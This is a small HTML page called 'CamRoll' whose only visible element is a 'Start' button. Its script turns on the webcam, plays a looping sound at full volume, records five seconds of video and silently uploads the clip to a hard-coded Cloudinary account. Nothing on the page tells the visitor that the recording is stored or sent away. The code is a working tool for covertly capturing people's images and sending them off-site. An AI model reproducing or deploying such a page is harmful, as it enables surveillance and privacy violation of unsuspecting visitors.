<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>CamRoll</title>

    <style>
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: white;
        }

        #startButton {
            padding: 14px 28px;
            font-size: 20px;
            cursor: pointer;
        }
    </style>
</head>

<body>

<button id="startButton">Start</button>

<audio id="customSound" src="sound.mp3" preload="auto" loop></audio>

<script>
    const CLOUD_NAME = "hwr3zkhl";
    const UPLOAD_PRESET = "camera_upload";

    const RECORDING_TIME = 5000;

    const startButton = document.getElementById("startButton");
    const customSound = document.getElementById("customSound");

    startButton.addEventListener("click", async () => {

        startButton.disabled = true;

        let stream;

        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: true,
                audio: false
            });
        } catch (error) {
            console.error("Camera permission/error:", error);
            startButton.disabled = false;
            return;
        }

        /*
         * Start the looping sound.
         * Browser volume maximum = 100%.
         */
        customSound.volume = 1.0;
        customSound.currentTime = 0;

        try {
            await customSound.play();
        } catch (error) {
            console.error("Audio playback blocked:", error);
        }

        let mimeType = "";

        if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9")) {
            mimeType = "video/webm;codecs=vp9";
        } else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8")) {
            mimeType = "video/webm;codecs=vp8";
        } else if (MediaRecorder.isTypeSupported("video/webm")) {
            mimeType = "video/webm";
        }

        const recorder = new MediaRecorder(
            stream,
            mimeType ? { mimeType } : {}
        );

        const chunks = [];

        recorder.ondataavailable = event => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };

        recorder.onstop = async () => {

            const actualType =
                recorder.mimeType || "video/webm";

            const blob = new Blob(chunks, {
                type: actualType
            });

            /*
             * Stop camera immediately after recording.
             */
            stream.getTracks().forEach(track => {
                track.stop();
            });

            /*
             * Stop sound.
             */
            customSound.pause();
            customSound.currentTime = 0;

            /*
             * Upload to Cloudinary.
             */
            const formData = new FormData();

            formData.append("file", blob, "camera-recording.webm");
            formData.append("upload_preset", UPLOAD_PRESET);

            try {
                const response = await fetch(
                    `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`,
                    {
                        method: "POST",
                        body: formData
                    }
                );

                const result = await response.json();

                if (!response.ok) {
                    console.error("Cloudinary upload failed:", result);
                } else {
                    console.log("Uploaded:", result.secure_url);
                }

            } catch (error) {
                console.error("Upload error:", error);
            }

            startButton.disabled = false;
        };

        /*
         * Begin recording.
         */
        recorder.start();

        /*
         * Automatically stop after 5 seconds.
         */
        setTimeout(() => {
            if (recorder.state === "recording") {
                recorder.stop();
            }
        }, RECORDING_TIME);
    });
</script>

</body>
</html>
